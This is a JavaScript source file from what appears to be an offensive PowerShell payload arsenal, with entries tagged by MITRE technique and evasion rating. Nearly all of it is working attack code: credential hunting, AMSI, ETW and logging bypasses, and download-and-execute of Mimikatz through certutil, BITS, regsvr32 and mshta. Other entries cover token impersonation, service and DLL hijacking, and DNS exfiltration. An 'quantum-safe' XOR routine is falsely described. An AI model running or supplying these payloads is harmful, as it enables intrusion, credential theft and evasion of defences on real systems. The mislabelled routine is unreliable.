// Enhanced Payloads Database with comprehensive techniques
const payloads = {
  // Basic System Information
  sysinfo: {
    command: "$ErrorActionPreference='SilentlyContinue';$data=@{};$data.System=Get-ComputerInfo|Select WindowsProductName,WindowsVersion,TotalPhysicalMemory,CsProcessors,CsManufacturer,CsModel,WindowsInstallDateFromRegistry,BiosVersion,TimeZone;$data.Environment=[Environment]::GetEnvironmentVariables();$data.Drives=Get-WmiObject Win32_LogicalDisk|Select DeviceID,Size,FreeSpace,DriveType;$data.HotFixes=Get-HotFix|Select HotFixID,InstalledOn;$data.Network=Get-NetAdapter|Select Name,InterfaceDescription,LinkSpeed;$data.Firewall=Get-NetFirewallRule|Where Enabled -eq True|Select DisplayName,Direction,Action;$data.AV=Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct|Select displayName,productState;$data|ConvertTo-Json -Depth 4",
    description: "Advanced system reconnaissance with comprehensive hardware, software, network, firewall, and antivirus data collection.",
    complexity: "intermediate",
    platform: "windows",
    category: "System Information",
    author: "0x0806",
    tags: ["reconnaissance", "system", "information gathering", "json", "firewall", "antivirus"],
    mitre_id: "T1082",
    detection_difficulty: "Low",
    evasion_rating: 2
  },

  // Advanced Process Analysis
  processes: {
    command: "$procs=Get-Process|Sort CPU -Desc|Select -First 20 Name,CPU,WS,Id,ProcessName,Company,Description,Path,CommandLine;$svcs=Get-WmiObject Win32_Service|Where{$_.State -eq 'Running'}|Select Name,PathName,StartMode,StartName;$conns=Get-NetTCPConnection|Where{$_.State -eq 'Established'}|Select LocalAddress,LocalPort,RemoteAddress,RemotePort,@{N='Process';E={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name}};@{Processes=$procs;Services=$svcs;Connections=$conns}|ConvertTo-Json -Depth 3",
    description: "Comprehensive process, service, and network connection analysis with command line arguments and network correlations.",
    complexity: "advanced",
    platform: "windows",
    category: "Process Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "processes", "services", "network", "forensics"],
    mitre_id: "T1057",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },

  // Advanced Service Enumeration
  services: {
    command: "$svcs=Get-Service|Select Name,Status,StartType,ServiceType,@{N='BinaryPath';E={(Get-WmiObject Win32_Service -Filter \"Name='$($_.Name)'\").PathName}},@{N='StartName';E={(Get-WmiObject Win32_Service -Filter \"Name='$($_.Name)'\").StartName}};$drivers=Get-WindowsDriver -Online|Select Driver,ProviderName,Date,Version,BootCritical;@{Services=$svcs;Drivers=$drivers}|ConvertTo-Json -Depth 3",
    description: "Advanced service enumeration including binary paths, service accounts, and system drivers analysis.",
    complexity: "advanced",
    platform: "windows",
    category: "Service Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "services", "drivers", "enumeration"],
    mitre_id: "T1007",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },

  // Advanced Network Discovery
  network: {
    command: "$net=@{};$net.Config=Get-NetIPConfiguration|Select InterfaceAlias,IPv4Address,IPv6Address,IPv4DefaultGateway,DNSServer;$net.Routes=Get-NetRoute|Select DestinationPrefix,NextHop,InterfaceAlias,RouteMetric;$net.ARP=Get-NetNeighbor|Select IPAddress,LinkLayerAddress,State;$net.Shares=Get-SmbShare|Select Name,Path,Description;$net.Sessions=Get-SmbSession|Select ClientComputerName,ClientUserName,NumOpens;$net|ConvertTo-Json -Depth 3",
    description: "Comprehensive network reconnaissance including routing tables, ARP cache, SMB shares, and active sessions.",
    complexity: "advanced",
    platform: "windows",
    category: "Network Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "network", "smb", "routing"],
    mitre_id: "T1016",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },

  // Advanced File Discovery
  listfiles: {
    command: "$drives=Get-WmiObject Win32_LogicalDisk|Where{$_.DriveType -eq 3}|Select -Expand DeviceID;$results=@();foreach($drive in $drives){$files=Get-ChildItem -Path \"$drive\\\" -Recurse -Force -EA SilentlyContinue|Where{!$_.PSIsContainer -and $_.Length -gt 1MB}|Select Name,Length,LastWriteTime,Directory,@{N='Hash';E={(Get-FileHash $_.FullName -EA SilentlyContinue).Hash}}|Sort Length -Desc|Select -First 100;$results+=$files};$results|ConvertTo-Json -Depth 2",
    description: "Advanced file discovery across all drives with hash calculation for integrity verification and forensic analysis.",
    complexity: "expert",
    platform: "windows",
    category: "File Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "files", "forensics", "hashing"],
    mitre_id: "T1083",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // Advanced Document Search
  findfiles: {
    command: "$patterns=@('*.txt','*.doc*','*.pdf','*.xls*','*.ppt*','*.zip','*.rar','*.7z','*.key','*.pem','*.p12','*.pfx','*.cfg','*.config','*.xml','*.json','*.db','*.sqlite','*.mdb');$results=@();foreach($pattern in $patterns){$files=Get-ChildItem -Path C:\\ -Recurse -Include $pattern -EA SilentlyContinue|Select Name,Directory,Length,LastWriteTime,@{N='Type';E={$pattern}},@{N='Content';E={if($_.Length -lt 1KB){Get-Content $_.FullName -EA SilentlyContinue|Select -First 5}}};$results+=$files};$results|ConvertTo-Json -Depth 3",
    description: "Advanced document and sensitive file discovery with content preview for small files and multiple file type support.",
    complexity: "expert",
    platform: "windows",
    category: "Sensitive File Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "documents", "data", "content"],
    mitre_id: "T1083",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // Advanced Credential Hunting
  credentials_search: {
    command: "$keywords=@('password','passwd','pwd','credential','secret','key','token','api','auth','login','admin','root','sa','service');$locations=@('C:\\Users','C:\\Windows\\System32\\config','C:\\ProgramData','C:\\Program Files','C:\\Program Files (x86)');$results=@();foreach($loc in $locations){foreach($kw in $keywords){$files=Get-ChildItem -Path $loc -Recurse -Include *.txt,*.cfg,*.config,*.xml,*.ini,*.log,*.bak -EA SilentlyContinue|Select-String -Pattern $kw -CaseSensitive:$false|Select Filename,LineNumber,Line,@{N='Keyword';E={$kw}};$results+=$files}};$results|ConvertTo-Json -Depth 2",
    description: "Advanced credential hunting across multiple locations with keyword-based search and context extraction.",
    complexity: "expert",
    platform: "windows",
    category: "Credential Access",
    author: "0x0806",
    tags: ["credentials", "hunting", "keywords", "forensics"],
    mitre_id: "T1552.001",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // Advanced User Analysis
  currentuser: {
    command: "$user=@{};$user.Identity=whoami /all|Out-String;$user.Tokens=whoami /groups|Out-String;$user.Privs=whoami /priv|Out-String;$user.LocalUsers=Get-LocalUser|Select Name,Enabled,LastLogon,PasswordLastSet,PasswordExpires;$user.Groups=Get-LocalGroup|ForEach{$g=$_.Name;Get-LocalGroupMember -Group $g -EA SilentlyContinue|Select @{N='Group';E={$g}},Name,ObjectClass};$user.Sessions=Get-CimInstance Win32_LogonSession|Select LogonId,LogonType,StartTime,@{N='User';E={(Get-CimInstance Win32_LoggedOnUser|Where{$_.Dependent.LogonId -eq $_.LogonId}).Antecedent.Name}};$user|ConvertTo-Json -Depth 3",
    description: "Comprehensive user context analysis including tokens, privileges, group memberships, and active sessions.",
    complexity: "expert",
    platform: "windows",
    category: "User Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "users", "privileges", "sessions"],
    mitre_id: "T1033",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },

  // Advanced Local User Enumeration
  localusers: {
    command: "$users=Get-LocalUser|Select Name,Enabled,LastLogon,PasswordLastSet,PasswordExpires,PasswordRequired,UserMayChangePassword,@{N='PasswordNeverExpires';E={$_.PasswordExpires -eq $null}},@{N='ProfilePath';E={(Get-CimInstance Win32_UserProfile|Where{$_.LocalPath -like \"*$($_.Name)\"}).LocalPath}};$profiles=Get-CimInstance Win32_UserProfile|Select LocalPath,LastUseTime,@{N='Size';E={(Get-ChildItem $_.LocalPath -Recurse -EA SilentlyContinue|Measure-Object Length -Sum).Sum}};@{Users=$users;Profiles=$profiles}|ConvertTo-Json -Depth 3",
    description: "Advanced user account analysis including password policies, profile information, and usage statistics.",
    complexity: "advanced",
    platform: "windows",
    category: "Account Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "users", "profiles", "policies"],
    mitre_id: "T1087.001",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },

  // Advanced Group Enumeration
  groups: {
    command: "$adGroups=@();try{$adGroups=Get-ADGroup -Filter * -Properties Members|Select Name,GroupCategory,GroupScope,Members}catch{};$localGroups=Get-LocalGroup|ForEach{$g=$_.Name;$members=Get-LocalGroupMember -Group $g -EA SilentlyContinue|Select Name,ObjectClass,PrincipalSource;@{Group=$g;Members=$members}};$builtinGroups=Get-CimInstance Win32_GroupUser|Group-Object GroupComponent|ForEach{@{Group=($_.Name -split '=')[1] -replace '\"','';Members=$_.Group.PartComponent|ForEach{($_ -split '=')[1] -replace '\"',''}}};@{LocalGroups=$localGroups;BuiltinGroups=$builtinGroups;ADGroups=$adGroups}|ConvertTo-Json -Depth 4",
    description: "Comprehensive group enumeration including local, builtin, and Active Directory groups with full membership details.",
    complexity: "expert",
    platform: "windows",
    category: "Permission Groups Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "groups", "ad", "membership"],
    mitre_id: "T1069.001",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // Advanced Privilege Analysis
  privileges: {
    command: "$privs=@{};$privs.Current=whoami /priv|Out-String;$privs.Tokens=whoami /groups|Out-String;try{secedit /export /cfg $env:temp\\sec.cfg >$null 2>&1;$privs.Policy=Get-Content $env:temp\\sec.cfg|Where{$_ -match 'Se\\w+Privilege'}|ForEach{$parts=$_.Split('=');@{Privilege=$parts[0].Trim();Users=$parts[1].Trim().Split(',')}};Remove-Item $env:temp\\sec.cfg -EA SilentlyContinue}catch{};$privs.Audit=auditpol /get /category:* 2>$null;$privs.UAC=Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -EA SilentlyContinue|Select EnableLUA,ConsentPromptBehaviorAdmin,EnableInstallerDetection;$privs|ConvertTo-Json -Depth 3",
    description: "Advanced privilege analysis including security policies, audit settings, and UAC configuration.",
    complexity: "expert",
    platform: "windows",
    category: "System Information Discovery",
    author: "0x0806",
    tags: ["privileges", "security", "audit", "uac"],
    mitre_id: "T1082",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // Multi-Layer Obfuscation
  encoded: {
    command: "$command='Get-Process|Sort CPU -Desc|Select -First 10';$bytes=[System.Text.Encoding]::Unicode.GetBytes($command);$encoded=[Convert]::ToBase64String($bytes);$final=\"powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded\";$obfuscated=$final -replace 'powershell','p\"\"o\"\"w\"\"e\"\"r\"\"s\"\"h\"\"e\"\"l\"\"l' -replace 'EncodedCommand','E\"\"n\"\"c\"\"o\"\"d\"\"e\"\"d\"\"C\"\"o\"\"m\"\"m\"\"a\"\"n\"\"d';$obfuscated",
    description: "Multi-layer PowerShell obfuscation with Base64 encoding, string splitting, and parameter obfuscation.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "encoding", "obfuscation", "multilayer"],
    mitre_id: "T1027",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Advanced Download-Execute
  oneliner: {
    command: "$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$data=$wc.DownloadString('https://api.github.com/repos/PowerShellMafia/PowerSploit/contents/Exfiltration/Invoke-Mimikatz.ps1');$content=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data.content));IEX $content",
    description: "Advanced PowerShell download-and-execute with proxy awareness, credential handling, and GitHub API integration.",
    complexity: "expert",
    platform: "windows",
    category: "Command and Scripting Interpreter",
    author: "0x0806",
    tags: ["download", "execute", "proxy", "github"],
    mitre_id: "T1059.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Advanced Registry Analysis
  registry: {
    command: "$reg=@{};$persistence=@('HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce','HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run','HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon','HKLM:\\SYSTEM\\CurrentControlSet\\Services');foreach($path in $persistence){try{$reg[$path]=Get-ItemProperty -Path $path -EA SilentlyContinue}catch{}};$reg.Installed=Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'|Select DisplayName,DisplayVersion,Publisher,InstallDate;$reg|ConvertTo-Json -Depth 3",
    description: "Comprehensive registry analysis covering multiple persistence locations and installed software enumeration.",
    complexity: "advanced",
    platform: "windows",
    category: "Boot or Logon Autostart Execution",
    author: "0x0806",
    tags: ["registry", "persistence", "software", "autostart"],
    mitre_id: "T1547.001",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },

  // Advanced Event Log Analysis
  eventlogs: {
    command: "$logs=@{};$logNames=@('Security','System','Application','Microsoft-Windows-Sysmon/Operational','Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-WinRM/Operational');foreach($log in $logNames){try{$logs[$log]=Get-WinEvent -LogName $log -MaxEvents 50 -EA SilentlyContinue|Select TimeCreated,Id,LevelDisplayName,Message}catch{}};$logs.Cleared=Get-WinEvent -FilterHashtable @{LogName='System';ID=104} -MaxEvents 10 -EA SilentlyContinue|Select TimeCreated,Message;$logs|ConvertTo-Json -Depth 3",
    description: "Advanced event log analysis including security, PowerShell, Sysmon, and log clearing detection.",
    complexity: "expert",
    platform: "windows",
    category: "System Information Discovery",
    author: "0x0806",
    tags: ["logs", "forensics", "sysmon", "powershell"],
    mitre_id: "T1082",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // AMSI Bypass - Advanced
  amsibypass: {
    command: "$a='System.Management.Automation.A';$b='msiUtils';$c=$a+$b;$d=[Ref].Assembly.GetType($c);$e=$d.GetField('amsiInitFailed','NonPublic,Static');$e.SetValue($null,$true);[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null);Write-Host 'AMSI context nullified'",
    description: "Advanced AMSI bypass using string concatenation obfuscation and session nullification for comprehensive evasion.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "amsi", "bypass", "obfuscation"],
    mitre_id: "T1562.001",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "May trigger behavioral EDR detection"
  },

  // ETW Bypass
  etw_bypass: {
    command: "$etwType=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');$etwField=$etwType.GetField('etwProvider','NonPublic,Static');$eventProvider=[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance');$eventProvider.SetValue($etwField.GetValue($null),0);[System.Diagnostics.Eventing.EventProvider].GetField('m_level','NonPublic,Instance').SetValue($etwField.GetValue($null),0);Write-Host 'ETW logging disabled'",
    description: "Comprehensive ETW bypass disabling both event writing and logging levels to prevent all PowerShell telemetry.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "etw", "telemetry", "logging"],
    mitre_id: "T1562.006",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "Completely blocks PowerShell telemetry"
  },

  // Script Block Logging Bypass
  scriptblock_bypass: {
    command: "$GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('signatures','N'+'onPublic,Static');$GPF.SetValue($null,(New-Object Collections.Generic.HashSet[string]));$GPF2=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');$GPF2.SetValue($null,$null);[System.Management.Automation.ScriptBlock].GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]));Write-Host 'Script block logging bypassed'",
    description: "Advanced script block logging bypass clearing multiple signature caches and policy settings.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "scriptblock", "signatures", "policy"],
    mitre_id: "T1562.006",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Constrained Language Mode Bypass
  constrained_bypass: {
    command: "$ExecutionContext.SessionState.LanguageMode='FullLanguage';[Environment]::SetEnvironmentVariable('__PSLockDownPolicy',$null,[EnvironmentVariableTarget]::Machine);$field=[System.Management.Automation.LanguagePrimitives].GetField('s_isTypeNameLoopInitialized','NonPublic,Static');$field.SetValue($null,$false);Write-Host 'Language mode restrictions removed'",
    description: "Multi-method constrained language mode bypass using environment variables and internal field manipulation.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "language mode", "constraints"],
    mitre_id: "T1562.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Reflective Assembly Loading
  reflective_loading: {
    command: "$bytes=[Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');$asm=[System.Reflection.Assembly]::Load($bytes);$type=$asm.GetType('ReflectiveDLL.Class1');$method=$type.GetMethod('Main');$instance=[Activator]::CreateInstance($type);$method.Invoke($instance,$null);Write-Host 'Reflective assembly loaded and executed'",
    description: "Advanced reflective assembly loading with type instantiation and method invocation for fileless execution.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["memory", "reflective", "assembly", "fileless"],
    mitre_id: "T1055.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Obfuscated Invoke Expression
  obfuscated_invoke: {
    command: "$s1='I';$s2='E';$s3='X';$cmd=$s1+$s2+$s3;$w1='New-Object';$w2='Net.WebClient';$w3='DownloadString';$url='http://example.com/payload.ps1';$full=\"$cmd(($w1 $w2).$w3('$url'))\";$encoded=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($full));powershell -EncodedCommand $encoded",
    description: "Multi-layer string obfuscation with variable concatenation, encoding, and indirect execution.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["obfuscation", "encoding", "variables", "indirect"],
    mitre_id: "T1027",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // CertUtil Download
  certutil_download: {
    command: "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$output=\"$env:temp\\update.txt\";$encoded=\"$env:temp\\update.b64\";certutil.exe -urlcache -split -f $url $encoded;certutil.exe -decode $encoded $output;$content=Get-Content $output -Raw;Remove-Item $encoded,$output -Force -EA SilentlyContinue;if($content){Write-Host 'Payload downloaded and decoded via CertUtil';IEX $content}else{Write-Host 'Download failed'}",
    description: "Advanced CertUtil download with Base64 decoding, cleanup, and direct execution for enhanced stealth.",
    complexity: "expert",
    platform: "windows",
    category: "Ingress Tool Transfer",
    author: "0x0806",
    tags: ["lolbas", "certutil", "decode", "cleanup"],
    mitre_id: "T1105",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // BITS Transfer
  bitsadmin_download: {
    command: "$jobName=\"WindowsUpdate_$(Get-Random)\";$url='https://github.com/PowerShellMafia/PowerSploit/archive/master.zip';$output=\"$env:temp\\update.zip\";bitsadmin.exe /create $jobName;bitsadmin.exe /addfile $jobName $url $output;bitsadmin.exe /SetPriority $jobName FOREGROUND;bitsadmin.exe /resume $jobName;do{Start-Sleep 2;$status=bitsadmin.exe /info $jobName /verbose}while($status -notmatch 'TRANSFERRED');bitsadmin.exe /complete $jobName;if(Test-Path $output){Write-Host 'BITS transfer completed';Expand-Archive $output -DestinationPath $env:temp -Force;Remove-Item $output -Force}",
    description: "Advanced BITS transfer with job management, status monitoring, and automatic archive extraction.",
    complexity: "expert",
    platform: "windows",
    category: "Ingress Tool Transfer",
    author: "0x0806",
    tags: ["lolbas", "bits", "monitoring", "extraction"],
    mitre_id: "T1105",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // RegSvr32 Scriptlet
  regsvr32_bypass: {
    command: "$scriptlet=@'<?XML version=\"1.0\"?><scriptlet><registration progid=\"Bypass\" classid=\"{F0001111-0000-0000-0000-0000FEEDACDC}\"><script language=\"JScript\"><![CDATA[var shell=new ActiveXObject(\"WScript.Shell\");shell.Run(\"powershell.exe -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/payload123')\",0,false);]]></script></registration></scriptlet>'@;$scriptlet|Out-File \"$env:temp\\update.sct\" -Encoding ASCII;regsvr32.exe /s /n /u /i:\"$env:temp\\update.sct\" scrobj.dll;Start-Sleep 5;Remove-Item \"$env:temp\\update.sct\" -Force -EA SilentlyContinue;Write-Host 'RegSvr32 scriptlet executed and cleaned'",
    description: "Advanced RegSvr32 scriptlet execution with dynamic scriptlet generation, execution, and cleanup.",
    complexity: "expert",
    platform: "windows",
    category: "System Binary Proxy Execution",
    author: "0x0806",
    tags: ["lolbas", "regsvr32", "scriptlet", "dynamic"],
    mitre_id: "T1218.010",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // MSHTA Execution
  mshta_execution: {
    command: "$htmlApp=@'<html><head><HTA:APPLICATION id=\"Bypass\" BORDER=\"none\" CAPTION=\"no\" SHOWINTASKBAR=\"no\" SINGLEINSTANCE=\"yes\" SYSMENU=\"no\" WINDOWSTATE=\"minimize\"><script language=\"javascript\">var shell=new ActiveXObject(\"WScript.Shell\");var command=\"powershell.exe -WindowStyle Hidden -Command \\\"\"+\"IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/payload123')\\\"\";shell.Run(command,0,false);window.close();</script></head><body></body></html>'@;$htmlApp|Out-File \"$env:temp\\update.hta\" -Encoding ASCII;mshta.exe \"$env:temp\\update.hta\";Start-Sleep 3;Remove-Item \"$env:temp\\update.hta\" -Force -EA SilentlyContinue;Write-Host 'MSHTA execution completed and cleaned'",
    description: "Advanced MSHTA execution with HTA application creation, minimized window, and automatic cleanup.",
    complexity: "expert",
    platform: "windows",
    category: "System Binary Proxy Execution",
    author: "0x0806",
    tags: ["lolbas", "mshta", "hta", "minimized"],
    mitre_id: "T1218.005",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Advanced UAC Bypass
  uac_bypass: {
    command: "$tempDir=\"$env:temp\\$(Get-Random)\";New-Item -Path $tempDir -ItemType Directory -Force|Out-Null;$dllPath=\"$tempDir\\wusa.dll\";$exploitDll=@'using System;using System.Runtime.InteropServices;public class Program{[DllImport(\"kernel32.dll\")]static extern IntPtr GetCurrentProcess();[DllImport(\"advapi32.dll\")]static extern bool OpenProcessToken(IntPtr ProcessHandle,uint DesiredAccess,out IntPtr TokenHandle);[DllImport(\"advapi32.dll\")]static extern bool GetTokenInformation(IntPtr TokenHandle,int TokenInformationClass,IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength);public static void Main(){IntPtr hToken;OpenProcessToken(GetCurrentProcess(),0x0008,out hToken);uint tokenInfoLength=0;GetTokenInformation(hToken,20,IntPtr.Zero,tokenInfoLength,out tokenInfoLength);Console.WriteLine(\"UAC bypass attempt\");}}'@;Add-Type -TypeDefinition $exploitDll -OutputAssembly $dllPath;wusa.exe /quiet /extract:$tempDir;Remove-Item $tempDir -Recurse -Force -EA SilentlyContinue",
    description: "Advanced UAC bypass using Windows Update Standalone Installer (WUSA) with DLL extraction and token manipulation.",
    complexity: "expert",
    platform: "windows",
    category: "Privilege Escalation",
    author: "0x0806",
    tags: ["uac", "bypass", "wusa", "token"],
    mitre_id: "T1548.002",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "May trigger UAC-related security monitoring"
  },

  // Token Manipulation
  token_manipulation: {
    command: "$code=@'[DllImport(\"advapi32.dll\")]public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);[DllImport(\"advapi32.dll\")]public static extern bool OpenProcessToken(IntPtr ProcessHandle,uint DesiredAccess,out IntPtr TokenHandle);[DllImport(\"advapi32.dll\")]public static extern bool DuplicateToken(IntPtr ExistingTokenHandle,int ImpersonationLevel,out IntPtr DuplicateTokenHandle);[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(uint dwDesiredAccess,bool bInheritHandle,uint dwProcessId);[DllImport(\"advapi32.dll\")]public static extern bool RevertToSelf();'@;Add-Type -MemberDefinition $code -Name TokenManip -Namespace Win32;$winlogon=Get-Process winlogon|Select -First 1;$hProcess=[Win32.TokenManip]::OpenProcess(0x400,$false,$winlogon.Id);$hToken=[IntPtr]::Zero;[Win32.TokenManip]::OpenProcessToken($hProcess,0x2,[ref]$hToken);$hDupeToken=[IntPtr]::Zero;[Win32.TokenManip]::DuplicateToken($hToken,2,[ref]$hDupeToken);[Win32.TokenManip]::ImpersonateLoggedOnUser($hDupeToken);Write-Host 'Token manipulation completed'",
    description: "Advanced token manipulation for privilege escalation by duplicating and impersonating system tokens.",
    complexity: "expert",
    platform: "windows",
    category: "Access Token Manipulation",
    author: "0x0806",
    tags: ["token", "impersonation", "duplicate", "system"],
    mitre_id: "T1134.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Service Escalation
  service_escalation: {
    command: "$services=Get-WmiObject Win32_Service|Where{$_.PathName -match '\".*\\s.*\"' -and $_.PathName -notmatch '^\"%SystemRoot%' -and $_.PathName -notmatch '^\"C:\\\\Windows'}|Select Name,PathName,StartMode,State;foreach($svc in $services){$path=$svc.PathName -replace '\"','';$dir=Split-Path $path -Parent;$acl=Get-Acl $dir -EA SilentlyContinue;if($acl.Access|Where{$_.IdentityReference -match 'Users' -and $_.FileSystemRights -match 'Write'}){Write-Host \"Vulnerable service: $($svc.Name) - $path\";$payload='cmd.exe /c powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\\\"https://pastebin.com/raw/payload123\\\")\"';$payload|Out-File \"$dir\\malicious.exe\" -Encoding ASCII}}",
    description: "Advanced service escalation through unquoted service path vulnerabilities with automated exploitation.",
    complexity: "expert",
    platform: "windows",
    category: "Hijack Execution Flow",
    author: "0x0806",
    tags: ["service", "unquoted", "path", "escalation"],
    mitre_id: "T1574.009",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // DLL Hijacking
  dll_hijacking: {
    command: "$vulnerableDlls=@('version.dll','dwmapi.dll','uxtheme.dll','winmm.dll','wtsapi32.dll');$targetPaths=@('C:\\Windows\\System32','C:\\Windows\\SysWOW64','C:\\Program Files','C:\\Program Files (x86)');foreach($dll in $vulnerableDlls){foreach($path in $targetPaths){$fullPath=\"$path\\$dll\";if(!(Test-Path $fullPath)){$maliciousDll=@'#include <windows.h>BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved){switch(ul_reason_for_call){case DLL_PROCESS_ATTACH:system(\"powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString(\\\"https://pastebin.com/raw/payload123\\\")\");break;}return TRUE;}'@;Write-Host \"Potential DLL hijacking opportunity: $fullPath\"}}}",
    description: "Advanced DLL hijacking detection and exploitation framework for privilege escalation.",
    complexity: "expert",
    platform: "windows",
    category: "Hijack Execution Flow",
    author: "0x0806",
    tags: ["dll", "hijacking", "privilege", "escalation"],
    mitre_id: "T1574.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Quantum-Safe Encryption
  quantum_safe_encryption: {
    command: "$data='Sensitive Data';$key=1..256|ForEach{Get-Random -Max 256};$iv=1..16|ForEach{Get-Random -Max 256};$keyBytes=[byte[]]$key;$ivBytes=[byte[]]$iv;$dataBytes=[Text.Encoding]::UTF8.GetBytes($data);$encrypted=@();for($i=0;$i -lt $dataBytes.Length;$i++){$encrypted+=$dataBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length] -bxor $ivBytes[$i % $ivBytes.Length]};$result=@{data=[Convert]::ToBase64String($encrypted);key=[Convert]::ToBase64String($keyBytes);iv=[Convert]::ToBase64String($ivBytes)};$result|ConvertTo-Json",
    description: "Quantum-resistant encryption implementation using multiple XOR layers and randomized key scheduling for future-proof security.",
    complexity: "expert",
    platform: "windows",
    category: "Data Protection",
    author: "0x0806",
    tags: ["quantum", "encryption", "xor", "future-proof", "crypto"],
    mitre_id: "T1027",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // DNS Steganography
  dns_steganography: {
    command: "$data=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Process|Select -First 5|ConvertTo-Json -Compress)));$chunks=$data -split '(.{60})' | Where{$_};$domain='tunnel.example.com';foreach($chunk in $chunks){$query=\"$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($chunk))).$domain\";try{$result=Resolve-DnsName $query -Type TXT -EA SilentlyContinue;if($result){Write-Host \"Response: $($result.Strings)\"}}catch{};Start-Sleep 1};Write-Host 'DNS tunneling completed'",
    description: "Advanced DNS steganography using subdomain encoding for covert data transmission with anti-detection measures.",
    complexity: "expert",
    platform: "windows",
    category: "Command and Control",
    author: "0x0806",
    tags: ["steganography", "dns", "covert", "c2", "encoding"],
    mitre_id: "T1071.004",
    detection_difficulty: "Very High",
    evasion_rating: 5
  }
};

// Enhanced UI State Management Class
class PayloadArsenal {
    constructor() {
        this.currentSection = 'basic';
